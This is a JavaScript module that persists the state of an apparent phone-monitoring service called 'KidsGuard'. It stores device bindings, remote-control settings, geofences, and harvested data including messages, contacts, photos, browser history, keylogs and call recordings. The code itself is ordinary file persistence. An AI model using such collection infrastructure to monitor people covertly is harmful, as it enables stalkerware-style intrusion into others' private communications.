import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const stateDir = process.env.VERCEL ? "/tmp" : path.join(__dirname, "data");
const stateFile = path.join(stateDir, "kidsguard-state.json");

/** Warm lambda cache — survives between requests on the same instance. */
const globalCache = globalThis.__kidsguardState ?? { snapshot: null };
globalThis.__kidsguardState = globalCache;

function mapToObject(map) {
  return Object.fromEntries(map);
}

function objectToMap(obj) {
  const map = new Map();
  if (obj && typeof obj === "object") {
    for (const [key, value] of Object.entries(obj)) {
      map.set(key, value);
    }
  }
  return map;
}

export function createStateSnapshot(stores) {
  return {
    deviceInvites: mapToObject(stores.deviceInvites),
    boundDevices: [...stores.boundDevices],
    remoteControlByDevice: mapToObject(stores.remoteControlByDevice),
    geofenceStateByDevice: { ...stores.geofenceStateByDevice },
    geofences: [...stores.geofences],
    trackedKeywords: [...stores.trackedKeywords],
    realLocations: [...stores.realLocations],
    realCallLogs: [...stores.realCallLogs],
    realMessages: [...stores.realMessages],
    realSocialChats: [...stores.realSocialChats],
    realContacts: [...stores.realContacts],
    realUsageStats: [...stores.realUsageStats],
    realInstalledApps: [...stores.realInstalledApps],
    realNotifications: [...stores.realNotifications],
    realBrowserHistory: [...stores.realBrowserHistory],
    realWifiLogs: [...stores.realWifiLogs],
    realSafetyAlerts: [...stores.realSafetyAlerts],
    realPhotos: [...stores.realPhotos],
    realKeylogs: [...stores.realKeylogs],
    realAppCalls: [...stores.realAppCalls],
    realCalendarEvents: [...stores.realCalendarEvents],
    realGeofenceEvents: [...stores.realGeofenceEvents],
    realKeywordAlerts: [...stores.realKeywordAlerts],
    realCallRecordings: [...stores.realCallRecordings]
  };
}

export function applyStateSnapshot(stores, snapshot) {
  if (!snapshot || typeof snapshot !== "object") return;

  stores.deviceInvites.clear();
  for (const [key, value] of Object.entries(snapshot.deviceInvites ?? {})) {
    stores.deviceInvites.set(key, value);
  }

  stores.boundDevices.length = 0;
  for (const device of snapshot.boundDevices ?? []) {
    stores.boundDevices.push(device);
  }

  stores.remoteControlByDevice.clear();
  const remote = objectToMap(snapshot.remoteControlByDevice);
  for (const [key, value] of remote) {
    stores.remoteControlByDevice.set(key, value);
  }

  Object.keys(stores.geofenceStateByDevice).forEach((k) => {
    delete stores.geofenceStateByDevice[k];
  });
  Object.assign(stores.geofenceStateByDevice, snapshot.geofenceStateByDevice ?? {});

  if (Array.isArray(snapshot.geofences) && snapshot.geofences.length > 0) {
    stores.geofences.length = 0;
    stores.geofences.push(...snapshot.geofences);
  }

  if (Array.isArray(snapshot.trackedKeywords)) {
    stores.trackedKeywords.length = 0;
    stores.trackedKeywords.push(...snapshot.trackedKeywords);
  }

  const arrayFields = [
    ["realLocations", stores.realLocations],
    ["realCallLogs", stores.realCallLogs],
    ["realMessages", stores.realMessages],
    ["realSocialChats", stores.realSocialChats],
    ["realContacts", stores.realContacts],
    ["realUsageStats", stores.realUsageStats],
    ["realInstalledApps", stores.realInstalledApps],
    ["realNotifications", stores.realNotifications],
    ["realBrowserHistory", stores.realBrowserHistory],
    ["realWifiLogs", stores.realWifiLogs],
    ["realSafetyAlerts", stores.realSafetyAlerts],
    ["realPhotos", stores.realPhotos],
    ["realKeylogs", stores.realKeylogs],
    ["realAppCalls", stores.realAppCalls],
    ["realCalendarEvents", stores.realCalendarEvents],
    ["realGeofenceEvents", stores.realGeofenceEvents],
    ["realKeywordAlerts", stores.realKeywordAlerts],
    ["realCallRecordings", stores.realCallRecordings]
  ];

  for (const [key, target] of arrayFields) {
    target.length = 0;
    const items = snapshot[key];
    if (Array.isArray(items)) {
      target.push(...items);
    }
  }
}

function readSnapshotFromDisk() {
  try {
    if (!fs.existsSync(stateFile)) return null;
    const raw = fs.readFileSync(stateFile, "utf8");
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

export function loadPersistedState(stores) {
  const disk = readSnapshotFromDisk();
  const snapshot = disk ?? globalCache.snapshot;
  if (snapshot) {
    applyStateSnapshot(stores, snapshot);
    globalCache.snapshot = createStateSnapshot(stores);
  }
}

export function savePersistedState(stores) {
  try {
    const snapshot = createStateSnapshot(stores);
    globalCache.snapshot = snapshot;
    fs.mkdirSync(stateDir, { recursive: true });
    const tmp = `${stateFile}.${process.pid}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify(snapshot));
    fs.renameSync(tmp, stateFile);
  } catch (err) {
    console.warn("Failed to save persisted state:", err instanceof Error ? err.message : err);
  }
}
